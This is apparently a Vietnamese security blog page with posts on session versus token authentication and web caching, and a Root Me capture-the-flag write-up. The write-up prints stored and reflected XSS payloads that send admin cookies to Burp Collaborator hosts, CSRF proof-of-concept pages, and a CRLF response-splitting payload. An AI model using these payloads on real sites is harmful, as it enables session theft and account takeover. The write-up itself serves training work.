<p> <strong>Khả năng bị  tấn công CSRF:</strong> Nói nôm na là doSession IDthường được lưu vàocookie mà  cookie đượctự độnggắn vào các request tới domain của bạn.</p>
<p> <strong>Không có khả năng mở rộng (Scalability)  với các flatform khác:</strong> </p>
<p>Bây giờ hãy thử tưởng tượng chúng ta đang có một trang web hoạt động ngon lành với Session rồi, nhưng tới một ngày chúng ta phải làm thêm các Native Apps (ứng dụng di động) cho hệ thống là IOS hoặc Android, và cùng sử dụng chung một Database với ứng dụng web hiện tại thì như thế nào?</p>
<p>Rõ ràng lúc này chúng ta sẽ không thể xác thực người dùng sử dụng Native app bằng Session được vì Native app không có Cookie, chỉ Browser mới có mà thôi.</p>
<p>Vậy nên Token-Based Authentication - JWT mới được sinh ra trên thế giới lập trình này để giải quyết vấn đề trên và hiện nay nó luôn được ưu tiên lựa chọn mỗi khi bắt đầu làm một dự án mới.</p>
<p> Mặc dù vậy, hiện tại Session-based Authentication thường được dùng trong các website thương mại ,nhỏ vừa (tham khảo phần mục đích của session trong bài viết của mình) và những ứng dụng web làm việc chủ yếu với browser, những hệ thống monolithic do cần sự tập trung trong việc lưu session data và sự hạn chế về domain.</p>
<h2>Token-Based Authentication</h2>



<p>Token-Based Authentication đã ra mắt cũng  được vài năm, nó đề xuất bởi OAuth 2.0 Framework. Cách thức hoạt động của kĩ thuật này khá giống với với Session-Based Authentication nhưng các công nghệ ngày nay vẫn ưu tiên sử dụng nó hơn, tại sao nhỉ?</p>
<p>Điều đầu tiên cần nhớ, Token-Based Authentication là statefull (khác với session ) vì vậy server sẽ không lưu trữ hồ sơ về việc người dùng đã đăng nhập hay token đã được tạo. </p>
<p>Dựa vào định dạng sẽ có 3 loại token chính là SAML ( Security Markup  Assertion Language), SWT ( Simple Web Token) và JWT (Json Web Token). Chi tiết về các loại này mình sẽ có bài viết riêng và trong bài này mĩnh sẽ lấy JWT để nói vì nó được chấp nhận và sử dụng rộng rãi như một tiêu chuẩn của các nền tảng web hiện đại (<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>) . </p>
<p>Nói qua một chút về JWT  để các bạn có hiểu rõ hơn về quy trình xác thực của nó (Chi tiết sẽ có bài viết riêng). JWT token định nghĩa là cách thức xác thực giữa các ứng dụng bằng một đối tượngJSON <strong>,</strong> nó bao gồm 3 phần lầ header, payload và chữ ký (signature). JWT sử dụng chữ kí số để đảm bảo tính toàn vẹn của token được tạo, phần payload sẽ chứa các thông tin của người dùng để xác thực , còn header để chỉ định thuật toán để mã hóa.</p>
<p> Dưới đây là Flow của Token-based Authentication:</p>
<figure class="wp-block-image"><img src="https://images.viblo.asia/17eeed29-52cf-4b4c-92b4-17c9adeb249a.png" alt="Session và Token Based Authentication - Viblo"/></figure>



<p>Đầu tiên user submit username/password , sau khi check thông tin hợp lệ server sẽ tạo token và trả lại token trong response cho người dùng. Phía client sẽ thực hiện lưu trữ, nếu như là trình duyệt web thì JWT có thể lưu vào Local Storage, IOS app thì sẽ là Keychain và Android app sẽ lưu vào SharedPreferences. Các request tiếp theo token sẽ được thêm vào request ở các vị trí như là Athorization header , URL , Cookie header hoặc request body. Server sẽ check token bằng cách kiểm tra chữ kí số (signature) , đảm bảo thông tin trong token là chính xác và token đó do server tạo ra. Response sẽ  được trả về nếu thành công hoặc thông báo lỗi xác thực nếu thất bại hoặc là lỗi 401 <strong><em>Unauthentication</em></strong>.</p>
<img src="/images/SS/image-13.png" class="[class names]" title="[500] [500] " alt="ERROR">




<h4> **Ưu điểm** :</h4>



<ul><li> ** **Phù hợp với nhiều loại client:** ** Nên nhớ, cookie là một concept đượccác browseráp dụng tự động, còn với các client sử dụng Web API như mobile, IoT device, server,... thì việc sử dụng cookie lại rất hạn chế. Sử dụng token trong header hay URL,... sẽ dễ dàng hơn cho client trong việc lưu lại token và truyền tải token.</li><li> **Scalability:**  Dễ dàng mở rộng server hơn. Điều này là nhờ tính stateless của JWT, server không cần phải lưu session state, nên trong trường hợp phía server sử dụng cơ chế load balancing, bất kỳ máy server nào cũng có thể handle request và vẫn có được state của user thay vì chỉ server mà user đã login.</li><li> **Chống CSRF:** Thông thường thì token được thêm vào URL hoặc Authorization header và request body ( kèm trong cookie rất ít ) nên sẽ phòng chống được các trường hợp tấn công như với trường hợp session/cookie. Ngoài ra ,theo như RFC thì token cũng có nhiều loại trong đó có lại chỉ sử dụng một lần hoặc chỉ dùng cho một hành động.</li></ul>


<h4>Nhược điểm:</h4>



<p> <strong>Phức tạp cho phía client</strong> : Cơ chế sử dụng token thường yêu cầu client phải có xử lý liên quan tới lưu token, gửi token, do vậy sẽ không phù hợp với những website kiểu cũ, sử dụng nhiều server render html và phần javascript hạn chế.</p>
<p> <strong>Thông tin dễ lộ:</strong>  JWTnókhông ẩn, không làm mờ, không che giấu dữ liệu gì cả, mà nó được sử dụng đểchứng minh rằng dữ liệu được tạo ra bởi một nguồn xác thực. Dữ liệu trong payload chỉ được Encoded bằng base64urlencode chứ không phải Encrypted. Chính vì vậy, thông thường người ta chỉ lưu 1 số thông tin thiết yếu như user_id, username mà không lưu những thông tin nhạy cảm như password vào token vgiao thức mã hóa đường truyền HTTPS để tránh tấn công MITM .</p>
<p>Ok minh đã trình bày tổng quát về 2 các xác thực dựa vào session và token. Các bạn muốm tìm hiểu sâu hơn có thể tham khảo link mình đã đểm bên dưới. Cảm ơn các bạn đã đọc bài !</p>
<h2>Tham khảo</h2>



<ul><li><a target="_blank" rel="noopener" href="https://kipalog.com/posts/Authentication-story-part-2--Authentication-co-ban">https://kipalog.com/posts/Authentication-story-part-2--Authentication-co-ban</a></li><li><a target="_blank" rel="noopener" href="https://wp-rocket.me/blog/difference-json-web-tokens-vs-session-cookies/">https://wp-rocket.me/blog/difference-json-web-tokens-vs-session-cookies/</a></li><li><a target="_blank" rel="noopener" href="https://trungquandev.com/hieu-sau-ve-jwt-json-web-tokens/">https://trungquandev.com/hieu-sau-ve-jwt-json-web-tokens/</a></li><li>Token-Based vs Session-Based Authentication: A survey</li><li>Pro ASP.NET Web API Security Securing ASP.NET Web API by by Badrinarayanan Lakshmiraghavan</li></ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/Session%20vs%20Token-Based%20Authentication/" data-id="ckhqle8tx000ro7jmez8a3kfg" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-WEB-CLIENT" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/WEB-CLIENT/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/WEB-CLIENT/">RooMe (Web-client)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <img src="/images/CTF/Rootme.jpg" class="[class names]" title="[500] [500] " alt="Root Me">


<h2>HTML – disabled buttons</h2>



<h4> **Resolution** </h4>



<p>Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled . </p>
 <img src="/images/CTF/image-1.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính ">




<p>Xóa thuộc tính “disabled” xong là có thể sử dụng được, từ đó submit bất cứ cái gì là sẽ có pass.</p>
 <img src="/images/CTF/image-12.png" class="[class names]" title="[500] [500] " alt="Pass nhận được (Xin giấu pass )">
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1.png" alt="" class="wp-image-9"/><figcaption>Pass nhận được (Xin giấu pass )</figcaption></figure>


<h2> **Javascript - Authentication** </h2>


<h3> **Resolution** </h3>



<p>View page source ta sẽ thấy việc xử lí đăng nhập sẽ qua file “login.js” </p>
 <img src="/images/CTF/image-2.png" class="[class names]" title="[500] [500] " alt="File login.js">




<p>Check file ta thấy luôn được user và password để đăng nhập. Và pass cx để bypass challenge</p>
 <img src="/images/CTF/image-3.png" class="[class names]" title="[500] [500] " alt="File login.js">



<h2>Javascript - Source</h2>


<h3>Resolution</h3>



<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy password.</p>
<h2>Javascript - Authentication 2</h2>


<h3>R **esolution** </h3>



<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy file login.js . Nhưng ở đâu cần một chút kiến thức về js để lấy được user và password.</p>
 <img src="/images/CTF/image-4.png" class="[class names]" title="[500] [500] " alt="file login.js">





<p>Như ta có thể thấy TheLists=”GOD:HIDDEN” =&gt; TheLists[i].split(“:”) =&gt; TheSplit[0] = “GOD” ; TheSplit[1]= “HIDDEN” =&gt; Username, Password.</p>
<h2>Javascript - Obfuscation 1</h2>


<h3>Resolution</h3>

 <img src="/images/CTF/image-5.png" class="[class names]" title="[500] [500] " alt="Password bị mã hóa">





<p>Nhìn qua ta thấy được password được mã hóa bằng URL encode. Sau khi decode ra ta có pass .</p>
<h2>Javascript - Obfuscation 2</h2>


<h3>Resolution</h3>

 <img src="/images/CTF/image-6.png" class="[class names]" title="[500] [500] " alt="Password bị mã hóa">




<p>Ở challeng này password được mã hóa bằng URL encode  + Unescape  + Convert ascii =&gt; String =&gt; Password</p>
<h2>Javascript - Native code</h2>


<h3>Resolution</h3>

 <img src="/images/CTF/image-7.png" class="[class names]" title="[500] [500] " alt=" ">




<p>Sử dụng console để decode và tìm ra password</p>
 <img src="/images/CTF/image-8.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính ">




<h2>Javascript - Obfuscation 3</h2>



<p>View page source ta thấy đoạn javascript, nhưng để tìm ra pass ta ko cần chú ý đến phần dechiffre() chỉ cần decode phần này:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));</span><br></pre></td></tr></table></figure>


<p>Chuyển các giá trị hex sang string ta sẽ được chuỗi “55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50”.</p>
<p>Xong bỏ vô String.fromCharCode(), có thể dùng console là ta có kết quả.</p>
<h2>XSS - Stored 1</h2>


 <img src="/images/CTF/image-10.png" class="[class names]" title="[500] [500] " alt="Form chat vs admin">





<p>Để tạo một xss stored bạn chỉ cần điền payload vào phần message và gửi cho admin rồi chờ đợi cho đến khi admin đọc tin nhắn có chứa mã độc.  </p>
<!-- wp:quote {"className":"is-style-large"} -->
<blockquote class="wp-block-quote is-style-large"><script>document.write("<img src='<a rel="noreferrer noopener" target="_blank" href="https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/%22+document.cookie+?fbclid=IwAR2Qjw0GL4j5rKbqMfQmAINqFeQ31C4RLfvz1YFiOZsC2G5djg_7ukUkh34">https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/"+document.cookie+</a>"'>");</script>Payload  + Burp Collaborator client


<p>Khi admin đọc tin nhắn script sẽ được thực thi , cookie sẽ được gửi về:</p>
 <img src="/images/CTF/image-11.png" class="[class names]" title="[500] [500] " alt=" ">





<p>Cookie của Admin dùng để pass challenge này !</p>
<h2>CSRF - 0 protection</h2>


<h3>Resolution</h3>



<p>Sau khi tạo tài khoản và đăng nhập vào profile ta sẽ thấy các mục như contact, profile, private. Trong form profile ta có mục update và vs user bình thường sẽ không thực hiện được bởi chỉ có admin ms có quyền tich vào hộp check “status”. Để bypass challenge này cần admin thực hiện update thông tin cho user bằng lỗ hổng csrf.</p>
<p>Sử dụng Burpsuite để bắt request submit Update và generate csrf poc hoặc  copy từ source rồi chỉnh sửa . Thêm vào đó thẻ input với type là “checkbox” , ô checkbox phải được check, mặc định values=”on”. Tạo function attack() sẽ thực  hiện submit update khi load lại trang.</p>
<p>Csrf poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; </span><br><span class="line">&lt;script&gt; function attack() </span><br><span class="line">&#123;document.getElementById(&quot;csrf&quot;).submit()&#125; </span><br><span class="line">&lt;&#x2F;script&gt; </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body onload&#x3D;&quot;attack()&quot;&gt; </span><br><span class="line">&lt;form id&#x3D;&quot;csrf&quot; action&#x3D;&quot;http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-client&#x2F;ch22&#x2F;?action&#x3D;profile&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;user&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;status&quot; value&#x3D;&quot;on&quot; checked&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>Bấy giờ post vào comment rồi submit cho admin, chờ  tầm 1 phút rồi vào mục “Private” để nhận pass.</p>
<h2>XSS - Reflected</h2>


<h3>Resolution</h3>



<p>Ta truyền payload vào param “p” và dùng dấu “ ‘ “ dể đóng ngoặc bởi dấu phẩy kép bị mã hóa.</p>
<p>Xss thông qua url <a target="_blank" rel="noopener" href="http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)">http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)</a></p>
 <img src="/images/CTF/image-12.png" class="[class names]" title="[500] [500] " alt="Thử nghiệm Xss thành công">



<p>Sử dụng burp collaborator client<a target="_blank" rel="noopener" href="http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27">http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27</a></p>
<p>Sau đó report cho Admin và chờ một chút sẽ nhận được flag</p>
<h2>CSRF - token bypass</h2>


<h3>Resolution</h3>



<p>Bài này tương tự cài CSRF 0 Protection nhưng khó hơn một chút bởi nó có sử dụng giá trị “forged-token” để ngăn chặn CSRF. Để có thể lừa admin submit như bài trước ta cần phải có token của admin nhưng điều này là không thể ta cần tìm một token  được sinh ra có thể dùng chung user thường vs admin. Trong mục “search” giá trị “forged-token” chúng ta có thể get và bỏ vào request gửi cho admin thực hiện lừa admin  submit một cách hợp lệ với giá trị “forged-token” đó.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CSRF POC</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;!-- CSRF PoC  --&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;body onload&#x3D;&quot;GetToken()&quot;&gt;    </span><br><span class="line">&lt;form id&#x3D;&quot;form-payload&quot; action&#x3D;&quot;?action&#x3D;profile&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;user&quot;&#x2F;&gt;   </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;status&quot; value&#x3D;&quot;on&quot;&#x2F;&gt;    </span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;forged-token&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&quot;&#x2F;&gt;   </span><br><span class="line">     &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;go&quot;&#x2F;&gt;  &lt;&#x2F;form&gt;   </span><br><span class="line">      &lt;script&gt;  var x &#x3D; new XMLHttpRequest();  </span><br><span class="line">      function GetToken() &#123;   </span><br><span class="line">           x.open(&quot;GET&quot;,&quot;?action&#x3D;profile&quot;,true);    </span><br><span class="line">           x.send(null);   &#125;  </span><br><span class="line">           x.onreadystatechange &#x3D; function() &#123;    </span><br><span class="line">               if (x.readyState &#x3D;&#x3D; XMLHttpRequest.DONE)</span><br><span class="line">                &#123;      </span><br><span class="line">                    var token &#x3D; x.responseText.match(&#x2F;name&#x3D;&quot;token&quot; value&#x3D;&quot;(.+)&quot;&#x2F;)[1];      </span><br><span class="line">                    document.getElementById(&quot;forged-token&quot;).value &#x3D; token;     </span><br><span class="line">                    document.getElementById(&quot;form-payload&quot;).submit();    &#125;</span><br><span class="line">                    </span><br><span class="line">      &#125;  &lt;&#x2F;script&gt; </span><br><span class="line">&lt;&#x2F;body&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>Submit cho admin và chờ một chút ta sẽ có kết quả.</p>
<h2>HTTP Response Splitting</h2>


<h3>Resolution</h3>



<p>Để vượt qua challenge này ta cần một chút kiến thức về CRLF ( Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D và 0x0A ). Hai kí tự này là một ký hiệu thể hiện sự kết thúc của response, và một response tiếp theo được bắt đầu, response ban đầu sẽ bị chia tách thành hai và nội dung của response thứ hai sẽ bị điều khiển bởi kẻ tấn công.Kẻ tấn công sau đó có thể tạo một request khác trong cùng một kết nối liên tục, và lừa người nhận (bao gồm cả các yếu tố trung gian) tin rằng response thứ hai này là để trả lời cho request thứ hai.</p>
 <img src="/images/CTF/image-14.png" class="[class names]" title="[500] [500] " alt="Dấu hiệu CRLF">




<p>Chú ý việc đâu tiền cần làm là thêm tiêu đề phản hồi HTTP giả mạo : Content-Length: 0.<br>Điều này khiến trình duyệt web coi đây là phản hồi bị chấm dứt và bắt đầu phân tích một phản hồi mới sau đó là các header còn lại để tạo thành một request hợp lệ.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%0D%0AContent-%20Length%3A%200 # ngắt response  </span><br><span class="line">%0D%0A # blank </span><br><span class="line">%0D%0AHTTP%2F1.1%20200%20OK # Tạo response mới  </span><br><span class="line">%0D%0AContent-Type%3A%20text%2Fhtml   </span><br><span class="line">%0D%0AX-XSS-Protection%3A%200  </span><br><span class="line">%0D%0ALast-Modified%3A%20Thu%2C%2001%20Jan%202099%2012%3A00%3A00%20GMT%20  </span><br><span class="line">%0D%0AContent-Length%3A%20192  </span><br><span class="line">%0D%0A  </span><br><span class="line">%0D%0%0D%0A%3cscript%3edocument.write%28%3cimg%20src%3dhttps%3a%2f%2fylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net%3f%22.concat(document.cookie).concat(%22%20%2f%3e%22))%3c%2fscript%3e</span><br></pre></td></tr></table></figure> 

<p>Submit và chờ kết quá trả về là session của admin.</p>
<h2>XSS STORED 2</h2>



<p>Challenge nay cong viec giong voi challenge XSS Store 1 , Nhung diem chu y o day la viec payload khong duoc truyen vao bang input value ma truyen qua http header, va cu the o day la cookie.</p>
<p>Thu bat request gui message cho admin ve check:</p>
 <img src="/images/CTF/image-16.png" class="[class names]" title="[500] [500] " alt="Bat request bang burp">




<p>Ket qua tra ve la</p>
 <img src="/images/CTF/image-17.png" class="[class names]" title="[500] [500] " alt="Gia tri cua status duoc lay tu cookie">




<p>Gia tri cua cookie “status= invite” da duoc dung de hien thi nguoi gui tin nhan.</p>
<p> Chen payload va doi admin doc tin nhan thoi!</p>
<p>Ket hop vs Burp collaborator client</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;document.write(%22&lt;img src&#x3D;http:&#x2F;&#x2F;075lta73ds2oebant1t1ba7s9jf93y.burpcollaborator.net?%22.concat(document.cookie).concat(%22 &#x2F;&gt;%22)) </span><br></pre></td></tr></table></figure>

<p>Script da duoc thuc thi</p>
 <img src="/images/CTF/image-18.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính ">



<p>Cookie nhan duoc dung de bypass challenge nay!!!! </p>
 <img src="/images/CTF/image-19.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính ">

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/WEB-CLIENT/" data-id="ckhqle8ty000to7jmam9wec7o" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Web Cache &amp; Cache Key" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Web%20Cache%20&%20Cache%20Key/" class="article-date">
  <time datetime="2020-06-14T04:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Web%20Cache%20&%20Cache%20Key/">Web Cache &amp; Cache Key</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2>Web Cache</h2>



<figure class="wp-block-image"><img src="https://techvccloud.mediacdn.vn/2018/6/18/web-cache-1529296599109108897388.png" alt="Web cache là gì? Tác dụng đối với website? - Ảnh 1."/></figure>



<h4>ĐỊnh nghĩa</h4>



<p>Web cache (HTTP cache) là một dứng dụng công nghệ thông tin cho bộ nhớ tạm thời (caching ) để chứa các phản hồi từ hệ thống máy chủ, giúp giảm thiểu dữ liệu cần được truyền qua mạng.</p>
<figure class="wp-block-image"><img src="https://i.imgur.com/CnTvQBC.png" alt="Pentest Q&A cùng Tsu] #7: Web-Cache Poisoning | Tsu BlogS ٩(^‿^)۶"/></figure>



<p> Web cache là một vùng nhớ  giữa client và server có nhiệm vụ là lưu trữ bản sao của những tài nguyên web sao cho gần với người dùng, cả về mặt chức năng trong web client hoặc những web caching servers riêng biệt. Tài nguyên đó có thể là :</p>
<ul><li>Ảnh</li><li>CSS</li><li>Các file HTML tĩnh</li><li>Các file Javascript</li></ul>


<p> **Tại sao lại cần Caching? ** </p>
<figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP_request.png" alt="Yêu cầu HTTP"/></figure>



<p>Thử nghĩ khi bạn truy cập vào 1 website bán hàng, trình duyệt sẽ phải load về rất nhiều nội dung như file ảnh, js, html …. Nếu không dùng có cache thì mỗi lần truy cập vào website đó tất cả nội dung sẽ lại phải load lại lần nữa. Như vậy mỗi lần click hay chuyển tag mà băng thông yếu cái chắc “tui nhìn mà tui  tức quá “ chưa kể có nếu như có nhiều người truy cập đến website nữa. </p>
<figure class="wp-block-image"><img src="https://images.viblo.asia/72dcd966-26ed-46a7-8565-0ba1cb7c59bb.png" alt=""/></figure>



<p>Lúc này bạn chỉ muốn load thật nhanh còn sysadmin muốn giảm gánh nặng cho máy chủ nên người ta đã dùng cách lưu lại các response các request thường gặp cả ở trên phía máy chủ (Server-side caching) và phía người dùng (Browser caching). Máy chủ sẽ không phải xử lý từng request riêng biệt nữa mà thay vào đó bộ cache sẽ giúp nó gửi trả ngay một response. Một giải pháp khác là bạn mua thêm nhiều máy chủ khác nhưng tất nhiên là bạn sẽ phải có rất nhiều tiền (Và ở đây chúng tôi không làm thees)</p>
<h4>Nội dung cache được lưu trữ ở đâu? </h4>



<figure class="wp-block-image"><img src="https://image.slidesharecdn.com/cacheinapigateway-150418032736-conversion-gate01/95/cache-in-api-gateway-18-638.jpg?cb=1429499697" alt=""/></figure>



<p> <strong>Server-side caching</strong>  </p>
<p>Người ta thường gọi là Surrogate Cache bởi vì nó hoạt động như Gateway cache . Một  Surrogate Cache là một server lưu các files tĩnh để phục vụ cho việc gửi trả lại các response cho các request phổ biến. Nó sẽ tiếp nhận các request thông thường và nhanh chóng gửi response. Caching proxy sẽ giúp máy chủ chính của bạn không phải xử lý các request này, do đó giảm gánh nặng cho phía server.</p>
<p> <strong>Browser caching</strong> </p>
<p>Trình duyệt sẽ phân vùng một lượng nhất định trên ổ cứng của máy tính. Dung lượng này dành để lưu trữ những nội dung bạn đã xem. Hình thức này cho phép truy xuất thông tin khá nhanh do dữ liệu web được lấy trực tiếp từ máy tính người dùng thay vì phải tải lại qua đường truyền mạng và cũng góp phần giảm lưu lượng phía server. Ví dụ trình duyệt lưu một bản sao của một tệp (như hình ảnh logo) và sử dụng bản sao được lưu trong bộ nhớ cache (đã lưu) này trên mỗi trang bạn vào mà cần logo đó.Điều này tránh phải tải xuống hình ảnh một lần nữa và hoàn hảo  phải không?</p>
<img src="/images/Cache/magento_leverage_browser_caching.png" class="[class names]" title="[500] [500] " alt="Browser caching">



<p>Đó lại là vấn đề ! Điều gì xảy ra khi logo công ty thay đổi? SOCOLA =&gt; CORONA</p>
<p>Bạn sẽ vẫn lướt truy cập vào website đó như thường nhưng bạn sẽ không biết logo của website đã được thay đổi bởi vì cái logo đang xuất hiện trong trình duyệt của bạn là từ browser cache mà ra. Bạn thử nghĩ thay vì 1 cái logo là file js hoặc html điều gì sẽ xảy ra ? . Kệ  m* thôi bởi vì đã có cách khăc phục mà hehe:</p>
<p>Gateway Cache sẽ lưu các files khác nhau ở những thời điểm khác nhau, nó sẽ quyết định xem files nào nên cache và các files đã được cache có tiếp tục được sử dụng không. Máy chủ báo cho trình duyệt <strong>version</strong> của tệp mà nó đang gửi.Máy chủ sẽ trả về mộtLast-modified - header response cùng với tệp (giả sử là logo.png), như thế này:</p>
<p>Last-modified: Fri, 16 Mar 2007 04:00:25 GMTFile Contents (could be an image, HTML, CSS, Javascript…)</p>
<p>Bây giờ trình duyệt biết rằng tệp mà nó nhận được (logo.png) đã được tạo vào ngày 16 tháng 3 năm 2007 và nó sẽ tiếp tục dùng logo từ Browser cache. Lần tiếp theo nếu  trình duyệt cần logo.png, nó sẽ tiếp tục thực hiện kiểm tra đặc biệt với máy chủ:</p>
<figure class="wp-block-image"><img src="https://betterexplained.com/wp-content/uploads/compression/HTTP-caching-last-modified_1.png" alt="HTTP caching last modified"/></figure>



<p>Ngoài ra còn một số header response là “Etag” có nhiệm vụ xác thực  nội dung chính xác được lưu trong cache và “Expires , Cache-Control “ để giới hạn thời gian, tránh trình duyệt không giao tiếp với máy chủ giả sử trong trường hợp file không thay đổi một thời gian dài. <a href="https://betterexplained.com/articles/how-to-optimize-your-site-with-http-caching/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Chi tiết </a></p>
<p> <strong>Proxy Cache</strong> </p>
<p>Ngoài hai nơi lưu trữ cache chính ra , trong một môi trường doanh nghiệp rộng lớn nguời ta còn sử dụng các thiết bị đòng vai trò Web proxy cache làm việc cùng nguyên tắc với browser cache, nhưng ở phương diện rộng lớn hơn. Proxy server đáp ứng hàng trăm hoặc hàng ngàn users cùng một cách thức, những tập đoàn lớn và IPS thường thiết lập chúng trên các firewalls, hoặc như một thiết bị độc lập (thường hiểu như là những phương tiện trung gian). Bởi vì proxy cache không phải là một phần của client hay server chính nên chúng ta không cần phải hiểu rõ. </p>
<!-- wp:image {"width":590,"height":334} -->
<figure class="wp-block-image is-resized"><img src="https://cache.digistar.vn/wp-content/uploads/2016/12/cache-2.png" alt="Kết quả hình ảnh cho Proxy Cache" width="590" height="334"/></figure>



<p>Tiện ở đây có một khái niệm minh muốn giới thiệu là Mạng cung cấp nội dung - Content Delivery Network (CDN), là tập các máy chủ trung gian ( hay còn được gọi là   transparent proxy cache ) được đặt khắp nơi trên thế giới.Hoạt động như một “Gateway” vì vậy mọi request đến mấy chủ trung tâm đều tự động phải đi qua nó , mục đích là giảm thiểu yêu cầu lên máy chủ. Hoạt động như mô hình của Proxy cache . Bạn tưởng tượng xem như Facebook hay Amazon sẽ phải đặt bao nhiêu CDN trên thế giới. Ngoài ra còn các các dịch vụ cho thuê CDN như của cloudFlare, Akamai … .</p>
